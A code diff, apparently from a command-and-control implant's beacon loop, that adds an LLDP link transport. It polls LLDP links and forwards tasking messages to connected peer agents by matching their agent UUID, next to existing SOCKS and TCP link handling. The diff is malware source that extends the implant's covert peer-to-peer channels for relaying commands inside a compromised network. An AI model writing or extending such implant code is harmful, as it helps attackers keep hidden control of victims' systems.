@@ -14,6 +14,7 @@
 #include <ssh.h>
 #include <ssh_client.h>
 #include <transport_tcp.h>
+#include <transport_lldp.h>
 #include <stackstr.h>
 
 using namespace stardust;
@@ -497,6 +498,12 @@ auto declfn instance::beacon_loop() -> void {
         }
 #endif
 
+#if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( LLDP_TRANSPORT )
+        if ( lldp_links && lldp_link_state ) {
+            starburst::lldp_poll_links( *this );
+        }
+#endif
+
 #ifdef INCLUDE_CMD_SOCKS
         // poll SOCKS connections for data before building request
         if ( socks_state ) {
@@ -758,6 +765,21 @@ auto declfn instance::beacon_loop() -> void {
                                             break;
                                         }
                                         tlnk = tlnk->next;
+                                    }
+                                }
+#endif
+
+#if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( LLDP_TRANSPORT )
+                                if ( !routed ) {
+                                    auto llnk = lldp_links;
+                                    while ( llnk ) {
+                                        if ( llnk->connected && llnk->agent_id && uuid_len > 0 &&
+                                             str_ncmp( llnk->agent_id, target_uuid, uuid_len ) == 0 ) {
+                                            starburst::lldp_link_send_msg( *this, llnk, msg_data, msg_len );
+                                            routed = true;
+                                            break;
+                                        }
+                                        llnk = llnk->next;
                                     }
                                 }
 #endif
